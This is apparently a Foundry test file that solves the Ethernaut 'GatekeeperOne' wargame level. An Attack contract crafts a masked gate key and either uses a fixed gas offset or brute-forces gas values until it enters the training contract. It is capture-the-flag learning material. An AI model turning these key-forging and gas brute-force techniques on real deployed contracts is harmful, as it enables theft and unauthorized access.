// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/13_GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);

        instance = new GatekeeperOne();

        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        vm.startPrank(player1, player1);
        //attacker.attackwithoutgas();
        attacker.attack(268);
        assertEq(instance.entrant(), player1);
        vm.stopPrank();
    }
}

contract Attack is Test {
    GatekeeperOne instance;

    constructor(address fb) {
        instance = GatekeeperOne(fb);
    }

    function attack(uint256 gas) public {
        bytes8 gateKey;
        uint16 origin = uint16(uint160(msg.sender));
        uint64 _gateKey = uint64(origin);
        gateKey = bytes8(_gateKey | uint64(0x1000000000000000));
        instance.enter{gas: 8191 * 10 + gas}(gateKey);
    }

    function attackwithoutgas() public {
        bytes8 gateKey;
        uint16 origin = uint16(uint160(msg.sender));
        uint64 _gateKey = uint64(origin);
        gateKey = bytes8(_gateKey | uint64(0x1000000000000000));
        for (uint256 i = 0; i < 8191; i++) {
            try instance.enter{gas: 8191 * 10 + i}(gateKey) {
                //<----268
                console.log(">>>>>>>>>>>>>>>>gas:", i);
                return;
            } catch {}
        }
        revert("No gas match found!");
    }
}
